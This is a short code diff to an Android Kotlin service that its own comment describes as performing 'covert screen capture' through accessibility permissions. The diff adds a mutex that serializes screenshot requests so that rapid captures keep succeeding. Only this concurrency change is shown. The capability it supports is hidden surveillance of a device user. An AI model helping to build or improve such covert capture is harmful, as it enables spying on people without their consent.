@@ -12,6 +12,9 @@ import java.io.File
 import java.io.FileOutputStream
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
+import kotlinx.coroutines.runBlocking
+import kotlinx.coroutines.sync.Mutex
+import kotlinx.coroutines.sync.withLock
 
 /**
  * AccessibilityService for covert screen capture.
@@ -23,6 +26,7 @@ class AccessibilityScreenCaptureService : AccessibilityService() {
 
     companion object {
         private const val TAG = "PASA_A11yScreenCapture"
+        private val screenshotMutex = Mutex()
 
         @Volatile
         var instance: AccessibilityScreenCaptureService? = null
@@ -105,6 +109,15 @@ class AccessibilityScreenCaptureService : AccessibilityService() {
             return null
         }
 
+        // Serialize screenshot requests to avoid ERROR_TAKE_SCREENSHOT_INTERVAL_RIGID
+        return runBlocking {
+            screenshotMutex.withLock {
+                takeScreenshotInternalLocked(outputDir)
+            }
+        }
+    }
+
+    private fun takeScreenshotInternalLocked(outputDir: File): File? {
         return try {
             val latch = CountDownLatch(1)
             var capturedBitmap: Bitmap? = null
